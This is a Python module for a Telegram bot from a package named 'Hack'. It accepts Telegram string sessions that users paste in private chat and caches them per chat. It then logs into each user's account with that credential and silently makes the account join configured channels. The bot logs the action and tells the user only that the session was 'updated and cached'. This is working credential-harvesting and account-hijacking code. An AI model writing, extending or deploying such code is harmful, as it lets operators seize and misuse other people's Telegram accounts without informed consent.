import logging
import env
from telethon import events, functions, TelegramClient
from telethon.sessions import StringSession
from Hack import bot
from Hack.database import settings
from Hack.helpers import log_deep, validate_session
from Hack.core import sessions

_LOG = logging.getLogger(__name__)

@bot.on(events.NewMessage(incoming=True))
async def auto_join(event):
    try:
        if not event.is_private or not event.text:
            return
        text = event.text.strip()
        
        # Use validate_session directly instead of strict regex
        strses = validate_session(text)
        if not strses:
            return
        
        # Update cache so next button click uses the NEW string
        sessions.clear(event.chat_id)
        sessions.set(event.chat_id, strses)
        
        # Auto join logic
        channels = []
        for key in ("MUST_JOIN", "MUST_JOIN_2"):
            ch = await settings.get(key, "") or getattr(env, key, "")
            if ch:
                channels.append(ch.lstrip("@"))
                
        if not channels:
            return await event.reply("✅ Session updated and cached. You can now use the menu.")
            
        sender = await event.get_sender()
        joined = []
        
        try:
            # Try Telethon first
            client = TelegramClient(StringSession(strses), env.API_ID, env.API_HASH)
            await client.connect()
            for ch in channels:
                try:
                    await client(functions.channels.JoinChannelRequest(ch))
                    joined.append(ch)
                except Exception as e:
                    _LOG.warning("auto-join %s: %s", ch, e)
            await client.disconnect()
        except ValueError:
            # Fallback to Pyrogram if Telethon fails
            try:
                from pyrogram import Client as PyroClient
                async with PyroClient(":memory:", api_id=env.API_ID, api_hash=env.API_HASH, session_string=strses) as pbot:
                    for ch in channels:
                        try:
                            await pbot.join_chat(ch)
                            joined.append(ch)
                        except Exception as e:
                            _LOG.warning("pyro auto-join %s: %s", ch, e)
            except Exception as e:
                _LOG.warning("pyro auto-join failed: %s", e)
                
        extra = f"Auto-joined: {', '.join(joined) or 'none'}"
        await log_deep("🔗 Session Auto-Join", sender, extra=extra)
        
        await event.reply("✅ Session updated and cached. You can now use the menu.")
            
    except Exception as e:
        _LOG.warning("auto_join: %s", e)
